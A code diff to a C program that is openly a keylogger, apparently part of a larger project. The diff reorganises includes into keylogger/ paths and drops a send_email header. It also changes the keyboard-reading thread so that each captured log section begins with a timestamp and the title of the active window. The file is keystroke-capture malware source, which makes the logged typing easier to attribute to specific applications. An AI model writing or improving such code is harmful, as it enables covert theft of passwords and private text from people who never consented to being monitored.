@@ -6,12 +6,11 @@
 #include <pthread.h>
 #include <errno.h>
 #include <sys/select.h>
-#include "file_handler.h"
-#include "keyboard_handler.h"
-#include "send_email.h"
-#include "utils.h"
+#include "utils/helpers.h"
+#include "keylogger/buffer.h"
+#include "keylogger/utils/keyboard.h"
+#include "keylogger/keylogger.h"
 #include "core_state.h"
-#include "keylogger.h"
 
 #define KEY_BUFFER_SIZE 64
 #define TEXT_BUFFER_SIZE 4096
@@ -54,10 +53,14 @@ void *read_keyboard(void *arg){
             }
             pthread_mutex_unlock(&window_mutex);
             if (flag_update_current_window){
+                char time_str[9];
+                char f_str[512];
+                get_current_time(time_str, sizeof(time_str));
                 pthread_mutex_lock(&window_mutex);
                 context->keyboard_handler.active_window = strdup(current_window);
-                write_error = write_or_buffer_event(&(context->file_handler), &buffer,
-                                                    context->keyboard_handler.active_window, &file_mutex);
+                snprintf(f_str, sizeof(f_str), "\n\n[%s] %s\n", time_str, context->keyboard_handler.active_window);
+
+                write_error = write_or_buffer_event(&(context->file_handler), &buffer, f_str, &file_mutex);
                 pthread_mutex_unlock(&window_mutex);
                 if (write_error) {
                     buffer_text_clear(&buffer);
